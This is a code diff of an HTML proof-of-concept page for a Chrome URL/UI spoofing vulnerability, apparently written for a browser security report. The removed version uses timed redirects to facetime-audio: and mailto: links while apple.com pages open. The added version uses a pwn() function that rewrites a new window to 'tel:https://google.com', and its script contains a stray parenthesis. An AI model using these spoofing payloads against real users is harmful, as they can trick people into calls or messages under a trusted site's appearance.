@@ -1,32 +1,13 @@
-<!DOCTYPE html>
 <html>
-<body>
-
-<!-- Button FaceTime -->
-<input type="button" value="Click Call Center (FaceTime)"
-onclick="
-setTimeout(function() {
-  window.open('https://www.apple.com/contact/');
-}, 1000);
-
-setTimeout(function() {
-  document.location = 'facetime-audio:+unthrz';
-}, 5000);
-">
-
-<br><br>
-
-<!-- Button Mailto -->
-<input type="button" value="Click Call Centers (Mailto)"
-onclick="
-setTimeout(function() {
-  window.open('https://security.apple.com/');
-}, 300);
-
-setTimeout(function() {
-  document.location = 'mailto:fake.apple@security?subject=POC%20-%20Chrome%20iOS%20UI%20Spoofing&body=Hello%20Chromium%20Security%20Team,%0D%0A%0D%0AThis%20is%20a%20POC%20for%20Chrome%20iOS%20UI%20spoofing.%20Clicking%20this%20button%20opens%20a%20mailto%20dialog%20while%20the%20page%20redirects%20to%20Apple.com.%0D%0A%0D%0ARegards,%0D%0AQadhafy%20Muhammad%20Tera';
-}, 1300);
-">
-
-</body>
+<head>
+    <title>Chrome Url Spoofing (bypass dangerous website) vulnerability</title>
+</head>
+<script>
+function pwn() {
+    w = window.open();
+    w.document.write('<p>Calling Google</p>'));
+    setTimeout("w.location.replace('tel:https://google.com');",5);
+}
+</script>
+<h1><button href="#" onclick="pwn()">CLICK TO CALL</button></h1>
 </html>
